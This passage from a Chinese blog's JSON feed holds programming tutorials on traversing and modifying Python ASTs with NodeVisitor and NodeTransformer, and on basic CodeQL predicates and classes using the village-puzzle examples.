class=\"line\">            decorator_list=[],</span><br><span class=\"line\">            returns=None,</span><br><span class=\"line\">        ),</span><br><span class=\"line\">    ],</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>观察可知，我们只需要拿到 <code>name='foo'</code>  这个信息就可以，那么我们怎么拿到这个值呢？</p>\n<p>AST 是一个个节点构成的树状结构，通过遍历 AST 上的每个节点，我们可以获得其相对应的属性信息。例如 <code>Module</code>  就是一个节点，其包含一个 <code>body</code>  的属性。</p>\n<p>先上代码 <code>visit_ast.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取源码并构建ast</span></span><br><span class=\"line\">content = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sample.py&quot;</span>).read()</span><br><span class=\"line\">script_ast = ast.parse(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义一个访问类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyVisit</span>(<span class=\"params\">ast.NodeVisitor</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit_FunctionDef</span>(<span class=\"params\">self,node</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(node.name)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node</span><br><span class=\"line\"></span><br><span class=\"line\">m = MyVisit()</span><br><span class=\"line\">m.visit(script_ast)</span><br></pre></td></tr></table></figure>\n<p>输出结果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo</span><br></pre></td></tr></table></figure>\n<p>我们继承了 <code>ast.NodeVisitor</code>  类，重载了访问 <code>FunctionDef</code>  节点的方法，将该节点对应的 <code>node.name</code>  进行了输出。如果你想存储函数的名称，可以在__init__函数中定一个数组，来存储这些 function name。</p>\n<p>但上述代码存在着一个问题，当访问完 <code>FunctionDef</code>  节点后，我们选择了直接 return，这样会导致 <code>FunctionDef</code>  中的子节点无法被访问。如果存在函数嵌套定义，我们就无法拿到所有的函数名称。我们修改 <code>sample.py</code>  的内容，如下所示</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">foo</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;hello!&#x27;</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">bar</span>():</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;world!&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>执行 <code>visit_ast.py</code> ，得到的输出结果</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo</span><br></pre></td></tr></table></figure>\n<p>为了解决这个问题，我们需要看一下 ast 中关于 NodeVisitor 类的定义</p>\n<h2 id=\"astnodevisitor\"><a class=\"markdownIt-Anchor\" href=\"#astnodevisitor\">#</a> ast.NodeVisitor</h2>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NodeVisitor</span>(<span class=\"params\"><span class=\"built_in\">object</span></span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    A node visitor base class that walks the abstract syntax tree and calls a</span></span><br><span class=\"line\"><span class=\"string\">    visitor function for every node found. ...</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span>(<span class=\"params\">self, node</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;Visit a node.&quot;&quot;&quot;</span></span><br><span class=\"line\">        method = <span class=\"string\">&#x27;visit_&#x27;</span> + node.__class__.__name__</span><br><span class=\"line\">        visitor = <span class=\"built_in\">getattr</span>(self, method, self.generic_visit)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> visitor(node)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">generic_visit</span>(<span class=\"params\">self, node</span>):</span></span><br><span class=\"line\">        <span class=\"string\">&quot;&quot;&quot;Called if no explicit visitor function exists for a node.&quot;&quot;&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> field, value <span class=\"keyword\">in</span> iter_fields(node):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(value, <span class=\"built_in\">list</span>):</span><br><span class=\"line\">                <span class=\"keyword\">for</span> item <span class=\"keyword\">in</span> value:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(item, AST):</span><br><span class=\"line\">                        self.visit(item)</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> <span class=\"built_in\">isinstance</span>(value, AST):</span><br><span class=\"line\">                self.visit(value)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 代码解读</span></span><br><span class=\"line\"><span class=\"built_in\">getattr</span>(<span class=\"built_in\">object</span>, name[, default])</span><br><span class=\"line\">返回一个对象的属性name，如果没有则返回默认值</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">getattr</span>(self, method, self.generic_visit)</span><br><span class=\"line\">通过继承 NodeVisitor，并定义method方法，就能实现多种类型节点的遍历</span><br></pre></td></tr></table></figure>\n<p>解析一下这个代码</p>\n<ul>\n<li>\n<p><code>visit(self, node)</code></p>\n<p>会先通过获取节点对应的类名，来获取对应的访问方法。最开始我们传递的 <code>script_ast</code>  就是一个 <code>Module</code> ，那么 <code>method</code>  即为 <code>visit_Module</code> 。</p>\n<p><code>visitor = getattr(self, method, self.generic_visit)</code>  这里涉及一个 Python 的函数 <code>getattr</code> ，其原始的函数定义为 <code>getattr(object, name[, default])</code> ，这个函数的作用是返回对象 object 的一个名为 name 的属性，如果不存在则返回默认值 default。</p>\n<p>在这个语境下的作用就是返回 <code>NodeVisitor.&#123;method&#125;</code>  这个属性，即返回 <code>NodeVisitor.visit_Module</code> 。如果这个属性没有定义，那么返回 <code>NodeVisitor.generic_visit</code> 。这样就可以理解为什么我们定义了一个 <code>visit_FunctionDef</code>  函数，就可以处理该节点的相关信息。</p>\n</li>\n<li>\n<p><code>generic_visit(self, node)</code></p>\n<p>这个是默认的节点遍历函数，从函数定义可知其会利用 <code>visit</code>  函数来遍历当前节点中所有键值对的值。</p>\n</li>\n</ul>\n<p>回顾我们的需求，我们想在访问 <code>FunctionDef</code>  节点后，还能够处理其子节点中的 <code>FunctionDef</code> ，结合这些代码，我们可以修正我们的遍历程序，如下所示</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取源码并构建ast</span></span><br><span class=\"line\">content = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sample.py&quot;</span>).read()</span><br><span class=\"line\">script_ast = ast.parse(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义一个访问类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyVisit</span>(<span class=\"params\">ast.NodeVisitor</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit_FunctionDef</span>(<span class=\"params\">self, node</span>):</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(node.name)</span><br><span class=\"line\">        self.generic_visit(node)</span><br><span class=\"line\"></span><br><span class=\"line\">m = MyVisit()</span><br><span class=\"line\">m.visit(script_ast)</span><br></pre></td></tr></table></figure>\n<p>运行结果</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">foo</span><br><span class=\"line\">bar</span><br></pre></td></tr></table></figure>\n<p>我们在访问第一个 <code>FunctionDef</code>  节点之后，使用 <code>generic_visit</code>  访问其子节点，结合上面函数定义，我们就可以访问到嵌套定义的第二个函数 <code>bar</code> 。</p>\n<h1 id=\"ast修改\"><a class=\"markdownIt-Anchor\" href=\"#ast修改\">#</a> AST 修改</h1>\n<p>既然不同的源码对应不同的 AST，那么如果我们直接在 AST 层面修改，其对应的源码是否也会发生变化呢？答案是 yes，接下来我们就通过一个简单的例子学习一下如何修改 AST，以及如果通过 AST 生成 Python 源码。</p>\n<p><code>sample.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">foo</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;func foo&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>AST 表示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Module(</span><br><span class=\"line\">    body&#x3D;[</span><br><span class=\"line\">        FunctionDef(</span><br><span class=\"line\">            lineno&#x3D;1,</span><br><span class=\"line\">            col_offset&#x3D;0,</span><br><span class=\"line\">            name&#x3D;&#39;foo&#39;,</span><br><span class=\"line\">            args&#x3D;arguments(args&#x3D;[], vararg&#x3D;None, kwonlyargs&#x3D;[], kw_defaults&#x3D;[], kwarg&#x3D;None, defaults&#x3D;[]),</span><br><span class=\"line\">            body&#x3D;[</span><br><span class=\"line\">                Expr(</span><br><span class=\"line\">                    lineno&#x3D;2,</span><br><span class=\"line\">                    col_offset&#x3D;4,</span><br><span class=\"line\">                    value&#x3D;Call(</span><br><span class=\"line\">                        lineno&#x3D;2,</span><br><span class=\"line\">                        col_offset&#x3D;4,</span><br><span class=\"line\">                        func&#x3D;Name(lineno&#x3D;2, col_offset&#x3D;4, id&#x3D;&#39;print&#39;, ctx&#x3D;Load()),</span><br><span class=\"line\">                        args&#x3D;[Str(lineno&#x3D;2, col_offset&#x3D;10, s&#x3D;&#39;func foo&#39;)],</span><br><span class=\"line\">                        keywords&#x3D;[],</span><br><span class=\"line\">                    ),</span><br><span class=\"line\">                ),</span><br><span class=\"line\">            ],</span><br><span class=\"line\">            decorator_list&#x3D;[],</span><br><span class=\"line\">            returns&#x3D;None,</span><br><span class=\"line\">        ),</span><br><span class=\"line\">    ],</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<p>假设我们想把上面 <code>sample.py</code>  中输出的内容修改成 <code>hello world!</code> ， <code>ast</code>  这个库也提供了相应的方法供我们参考。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> ast</span><br><span class=\"line\"><span class=\"keyword\">import</span> astunparse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 读取源码并构建ast</span></span><br><span class=\"line\">content = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;sample.py&quot;</span>).read()</span><br><span class=\"line\">script_ast = ast.parse(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义一个访问类</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyTransformer</span>(<span class=\"params\">ast.NodeTransformer</span>):</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit_Str</span>(<span class=\"params\">self, node</span>):</span></span><br><span class=\"line\">        node.s = <span class=\"string\">&#x27;hello world!&#x27;</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> node</span><br><span class=\"line\"></span><br><span class=\"line\">m = MyTransformer()</span><br><span class=\"line\">modified = m.visit(script_ast)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(astunparse.Unparser(modified))</span><br></pre></td></tr></table></figure>\n<p>运行结果</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">foo</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;hello world!&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<p>同理，我们看一下 <code>ast</code>  中关于 <code>NodeTransformer</code>  的定义</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">NodeTransformer</span>(<span class=\"params\">NodeVisitor</span>):</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">    A :class:`NodeVisitor` subclass that walks the abstract syntax tree and</span></span><br><span class=\"line\"><span class=\"string\">    allows modification of nodes. ...</span></span><br><span class=\"line\"><span class=\"string\">    &quot;&quot;&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">generic_visit</span>(<span class=\"params\">self, node</span>):</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> field, old_value <span class=\"keyword\">in</span> iter_fields(node):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(old_value, <span class=\"built_in\">list</span>):</span><br><span class=\"line\">                new_values = []</span><br><span class=\"line\">                <span class=\"keyword\">for</span> value <span class=\"keyword\">in</span> old_value:</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">isinstance</span>(value, AST):</span><br><span class=\"line\">                        value = self.visit(value)</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> value <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\">                        <span class=\"keyword\">elif</span> <span class=\"keyword\">not</span> <span class=\"built_in\">isinstance</span>(value, AST):</span><br><span class=\"line\">                            new_values.extend(value)</span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    new_values.append(value)</span><br><span class=\"line\">                old_value[:] = new_values</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> <span class=\"built_in\">isinstance</span>(old_value, AST):</span><br><span class=\"line\">                new_node = self.visit(old_value)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> new_node <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">delattr</span>(node, field)</span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"built_in\">setattr</span>(node, field, new_node)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> node</span><br></pre></td></tr></table></figure>\n<p><code>NodeTransformer</code>  继承了 <code>NodeVisitor</code> ，所以定义遍历节点的方法是一样的。我们想修改 <code>Str</code>  节点，所以就重载了 <code>visit_Str</code>  这个函数，并对其进行修改。</p>\n<ul>\n<li>\n<p><code>generic_visit(self, node)</code></p>\n<p>我们直接观察第二个分支语句</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">elif</span> <span class=\"built_in\">isinstance</span>(old_value, AST):</span><br><span class=\"line\">    new_node = self.visit(old_value)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> new_node <span class=\"keyword\">is</span> <span class=\"literal\">None</span>:</span><br><span class=\"line\">        <span class=\"built_in\">delattr</span>(node, field)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"built_in\">setattr</span>(node, field, new_node)</span><br></pre></td></tr></table></figure>\n<p>当遍历 <code>old_value</code>  时，会得到一个返回值 <code>new_node</code> ，然后如果返回值为 <code>None</code> ，则代表 <code>old_value</code>  被删除了，所以对当前遍历的节点 <code>node</code>  进行了删除属性操作 <code>delattr(node, field)</code> 。若不为 <code>None</code> ，则用新的值替换原有的 <code>old_value</code> ，即 <code>setattr(node, field, new_node)</code></p>\n<p>所以当我们遍历修改完 <code>node.s</code>  之后，我们需要将修改后的节点进行返回。</p>\n<p>当这个节点 <code>node</code>  的处理都结束后， <code>generic_visit</code>  会返回修改后的节点。也就完成了 AST 的重构</p>\n</li>\n</ul>\n<p>通过第三方库函数 <code>astunparse.Unparser</code> ，我们可以将修改后的 AST 还原为源码。</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://snowroll.github.io/codeql-query/",
            "url": "https://snowroll.github.io/codeql-query/",
            "title": "CodeQL 查询",
            "date_published": "2023-07-31T00:00:00.000Z",
            "content_html": "<p>codeql 查询 sink-source</p>\n<p>快照包含源文件和数据库，  ql 代码查询的是数据库中的数据，然后将符合要求的结果映射到对应的源代码中</p>\n<p>核心思想 —— 将代码作为数据处理</p>\n<p>QL 谓词 —— 微型查询，表征数据之间的关系。已有的谓词保存在 QL 库中 .qll，可以通过 <code>import tutorial</code>  方式导入 tutorial 库</p>\n<h1 id=\"谓词定义\"><a class=\"markdownIt-Anchor\" href=\"#谓词定义\">#</a> 谓词定义</h1>\n<p>谓词描述 —— 给定参数和元组集合的关系</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">predicate isCountry(string country)&#123;</span><br><span class=\"line\">  country &#x3D; &quot;Germany&quot;</span><br><span class=\"line\">  or</span><br><span class=\"line\">  country &#x3D; &quot;Belgium&quot;</span><br><span class=\"line\">  or</span><br><span class=\"line\">  country &#x3D; &quot;France&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>谓词定义解析</p>\n<ul>\n<li>predicate 关键字，适用于没有返回结果的谓词  或者返回结果类型，例如 int</li>\n<li>isCountry 谓词名称，以小写字母开头</li>\n<li>string country  谓词参数，多个以逗号间隔</li>\n<li>{…}  谓词主体，逻辑表达式</li>\n</ul>\n<p><strong>带有返回结果的谓词</strong></p>\n<p>引入一个特殊变量 result</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int getSucessor(int i)&#123;</span><br><span class=\"line\">  <span class=\"keyword\">result</span> <span class=\"operator\">=</span> i<span class=\"operator\">+</span><span class=\"number\">1</span> <span class=\"keyword\">and</span> i <span class=\"keyword\">in</span> [<span class=\"number\">1.</span><span class=\"number\">.9</span>]</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>每个参数都带一个返回值（或者一个也不带）</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string getANeighbor(string country) &#123;</span><br><span class=\"line\">  country = <span class=\"string\">&quot;France&quot;</span> <span class=\"keyword\">and</span> result = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">or</span></span><br><span class=\"line\">  country = <span class=\"string\">&quot;France&quot;</span> <span class=\"keyword\">and</span> result = <span class=\"string\">&quot;Germany&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">or</span></span><br><span class=\"line\">  country = <span class=\"string\">&quot;Germany&quot;</span> <span class=\"keyword\">and</span> result = <span class=\"string\">&quot;Austria&quot;</span></span><br><span class=\"line\">  <span class=\"keyword\">or</span> </span><br><span class=\"line\">  country = <span class=\"string\">&quot;Germany&quot;</span> <span class=\"keyword\">and</span> result = <span class=\"string\">&quot;Belgium&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>getANeighbor (“Germany”) 返回结果 “Austria&quot;和&quot;Belgium”</li>\n<li>getANeighbor (“Belgium”) 无返回结果</li>\n</ul>\n<p><strong>递归谓词</strong></p>\n<p>谓词的返回结果直接或间接依赖于自身</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">string getANeighbor(string country) &#123;</span><br><span class=\"line\">  country <span class=\"operator\">=</span> &quot;France&quot; <span class=\"keyword\">and</span> <span class=\"keyword\">result</span> <span class=\"operator\">=</span> &quot;Belgium&quot;</span><br><span class=\"line\">  <span class=\"keyword\">or</span></span><br><span class=\"line\">  country <span class=\"operator\">=</span> &quot;France&quot; <span class=\"keyword\">and</span> <span class=\"keyword\">result</span> <span class=\"operator\">=</span> &quot;Germany&quot;</span><br><span class=\"line\">  <span class=\"keyword\">or</span></span><br><span class=\"line\">  country <span class=\"operator\">=</span> &quot;Germany&quot; <span class=\"keyword\">and</span> <span class=\"keyword\">result</span> <span class=\"operator\">=</span> &quot;Austria&quot;</span><br><span class=\"line\">  <span class=\"keyword\">or</span></span><br><span class=\"line\">  country <span class=\"operator\">=</span> &quot;Germany&quot; <span class=\"keyword\">and</span> <span class=\"keyword\">result</span> <span class=\"operator\">=</span> &quot;Belgium&quot;</span><br><span class=\"line\">  <span class=\"keyword\">or</span></span><br><span class=\"line\">  country <span class=\"operator\">=</span> getANeighbor(<span class=\"keyword\">result</span>)</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>getANeighbor (“Belgium”)  返回 “France&quot;和&quot;Germany”</p>\n<p>简单解析，当前 4 个逻辑表达式都不正确时，判断 country = getANeighbor (result)，给定的参数时 &quot;Belgium&quot;，所以这里逻辑表达式成立的条件是 country=“Belgium”=getANeighbor (result)。</p>\n<p>getANeighbor () 返回值是 &quot;Belgium&quot;, 其成立条件是传入的参数为 &quot;France&quot; 或者 &quot;Germany&quot;，这里用 result 来作为 getANeighbor () 的参数，所以最终的返回结果为 &quot;France&quot; 和 &quot;Germany&quot;</p>\n</li>\n</ul>\n<p>将线索转换为查询语句</p>\n<p>查询某个不秃头的人</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Person t</span><br><span class=\"line\"><span class=\"keyword\">where</span> <span class=\"keyword\">exists</span>(string c <span class=\"operator\">|</span> t.getHairColor()<span class=\"operator\">=</span>c)</span><br><span class=\"line\"><span class=\"keyword\">select</span> t</span><br></pre></td></tr></table></figure>\n<ul>\n<li>exists 关键字，是否存在</li>\n<li>string c 临时变量</li>\n<li>t.getHairColor () = c 逻辑表达式</li>\n</ul>\n<h1 id=\"类定义\"><a class=\"markdownIt-Anchor\" href=\"#类定义\">#</a> 类定义</h1>\n<p>自定义类，来找出考察对象，即住在村南的居民</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perdicate southern(Person p) &#123;</span><br><span class=\"line\">  p.getLocation() <span class=\"operator\">=</span> &quot;south&quot;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">class Southerner extends Person &#123;</span><br><span class=\"line\">  Southerner() &#123;southern(this)&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>QL 中类用来表示一个逻辑属性 —— 当一个值满足该属性时，它是类的成员。这意味一个值可以属于多个类，例如 3 既属于 &quot;整数&quot; 类，也属于 &quot;奇数&quot; 类</p>\n<p>上述类定义中， <code>southern(this)</code>  定义了该类的逻辑属性。表达式中使用了特殊变量 this，表示一个 Person 类型的值。如果一个 Person 满足 southern (this)，那他属于 Southerner 类，即住在村南的居民。</p>\n<p>当列举村南的居民，代码如下</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Southerner s</span><br><span class=\"line\"><span class=\"keyword\">select</span> s</span><br></pre></td></tr></table></figure>\n<p>部分谓词以参数传递变量，例如 southern§，部分谓词跟着某些变量后面，例如 p.getAge ()。这是因为 getAge () 是定义在类 Person 中的一个成员谓词</p>\n<p>例如，王冠丢失后，村落实施了交通管制，孩子不允许离开居住地。即意味着谓词 isAllowedIn (string region) 不适用所有村名和所有区域，所以需要对孩子重载原来的谓词 isAllowedIn (string region)。</p>\n<p>重新定义一个类 Child，表示所有 10 岁以下的村民，重新定义谓词 